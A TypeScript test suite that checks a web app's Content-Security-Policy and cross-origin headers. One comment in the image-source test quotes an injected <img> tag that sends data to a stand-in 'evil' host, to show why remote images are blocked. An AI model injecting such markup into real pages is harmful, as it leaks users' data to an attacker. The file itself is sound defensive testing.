import * as fs from 'fs';
import * as path from 'path';
import { buildCsp } from '@web/lib/security/csp';

function directive(csp: string, name: string): string[] {
  const entry = csp.split('; ').find((part) => part === name || part.startsWith(`${name} `));
  return entry ? entry.split(' ').slice(1) : [];
}

describe('Content-Security-Policy', () => {
  // buildCsp relaxes script-src for Next's dev HMR unless NODE_ENV is production.
  const env = process.env as Record<string, string | undefined>;
  const originalNodeEnv = env.NODE_ENV;
  let csp = '';

  beforeAll(() => {
    env.NODE_ENV = 'production';
    csp = buildCsp('test-nonce');
  });

  afterAll(() => {
    env.NODE_ENV = originalNodeEnv;
  });

  it('loads images only from this origin and inline data/blob URLs', () => {
    // The web app embeds no remote images, so an https: wildcard would only serve
    // as an exfiltration channel for injected markup (<img src="https://evil/?d=...">).
    expect(directive(csp, 'img-src').sort()).toEqual(["'self'", 'blob:', 'data:']);
  });

  it('keeps scripts on a per-request nonce with no inline or eval allowance', () => {
    const script = directive(csp, 'script-src');
    expect(script).toContain("'nonce-test-nonce'");
    expect(script).not.toContain("'unsafe-inline'");
    expect(script).not.toContain("'unsafe-eval'");
  });

  it('forbids framing, plugins and base-tag hijack', () => {
    expect(directive(csp, 'frame-ancestors')).toEqual(["'none'"]);
    expect(directive(csp, 'object-src')).toEqual(["'none'"]);
    expect(directive(csp, 'base-uri')).toEqual(["'self'"]);
  });
});

describe('static response headers', () => {
  const config = fs.readFileSync(path.resolve(__dirname, '../../web/next.config.mjs'), 'utf8');

  it.each([
    ['Cross-Origin-Opener-Policy', 'same-origin'],
    ['Cross-Origin-Resource-Policy', 'same-origin'],
  ])('sets %s: %s on every route', (key, value) => {
    expect(config).toContain(`key: '${key}', value: '${value}'`);
  });
});
